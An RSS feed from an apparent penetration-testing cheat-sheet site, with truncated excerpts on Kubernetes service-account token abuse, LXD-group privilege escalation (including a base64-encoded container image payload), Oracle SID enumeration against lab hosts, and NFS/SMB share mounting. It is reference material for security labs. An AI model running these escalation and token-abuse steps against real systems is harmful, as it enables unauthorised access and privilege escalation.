<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>File System Permissions Vulnerabilities on TLDRBins</title>
    <link>https://tldrbins.github.io/@file-system-permissions-vulnerabilities/</link>
    <description>Recent content in File System Permissions Vulnerabilities on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://tldrbins.github.io/@file-system-permissions-vulnerabilities/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Kubernetes</title>
      <link>https://tldrbins.github.io/kubernetes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/kubernetes/</guid>
      <description>Token Location /run/secrets/kubernetes.io/serviceaccount/token Certificate Location /run/secrets/kubernetes.io/serviceaccount/ca.crt General # List all namespaces kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; get namespaces # Get user permissions in current namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; auth can-i --list # Get user permissions in specific namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; auth can-i --list -n &amp;lt;NAMESPACE&amp;gt; # List all pods kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; get pods --all-namespaces # List pods in specific namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.</description>
    </item>
    <item>
      <title>Lxd</title>
      <link>https://tldrbins.github.io/lxd/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/lxd/</guid>
      <description>General # Check if user in lxd group id orestis@brainfuck:~$ id uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare) # List containers lxc list orestis@brainfuck:~$ lxc list Generating a client certificate. This may take a minute... If this is your first time using LXD, you should also run: sudo lxd init To start your first container, try: lxc launch ubuntu:16.04 +------+-------+------+------+------+-----------+ | NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS | +------+-------+------+------+------+-----------+ # List images lxc image list orestis@brainfuck:~$ lxc image list +-------+-------------+--------+-------------+------+------+-------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE | +-------+-------------+--------+-------------+------+------+-------------+ Abuse #1: Mount host&amp;rsquo;s File System # Upload a 656 bytes conatiner image echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d &amp;gt; test.</description>
    </item>
    <item>
      <title>Oracle Database</title>
      <link>https://tldrbins.github.io/oracledb_general/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/oracledb_general/</guid>
      <description>Tools sqlplus ODAT # Installation sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V # Installation sudo apt install odat # Check odat --version Ref: Download ODAT&#xA;Enum # SID enum (You only need one) odat sidguesser -s &amp;lt;TARGET&amp;gt; $ ./odat-libc2.17-x86_64 sidguesser -s 10.129.95.188 [1] (10.129.95.188:1521): Searching valid SIDs [1.1] Searching valid SIDs thanks to a well known SID list on the 10.129.95.188:1521 server [+] &amp;#39;XE&amp;#39; is a valid SID.</description>
    </item>
    <item>
      <title>Share Mount</title>
      <link>https://tldrbins.github.io/share_mount/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/share_mount/</guid>
      <description>NFS SMB List Shares showmount -e &amp;lt;TARGET&amp;gt; $ showmount -e 10.10.11.191 Export list for 10.10.11.191: /home/ross * /var/www/html * Mount Share sudo mkdir /mnt/share $ sudo mkdir /mnt/share sudo mount -t nfs &amp;lt;TARGET&amp;gt;:&amp;lt;SHARE&amp;gt; /mnt/share/ $ sudo mount -t nfs 10.10.11.191:/home/ross /mnt/share/ $ ls /mnt/share Desktop Documents Downloads Music Pictures Public Templates Videos Unmount Share sudo umount /mnt/share/ $ sudo umount /mnt/share/ Mount Share sudo mount -t cifs //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt # Without creds sudo mount -t cifs -o user=,password= //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt # With creds sudo mount -t cifs -o user=&amp;#39;&amp;lt;USER&amp;gt;&amp;#39;,pass=&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt $ sudo mount -t cifs -o ro,user=&amp;#39;localadmin&amp;#39;,password=&amp;#39;Secret123&amp;#39; //10.</description>
    </item>
  </channel>
</rss>
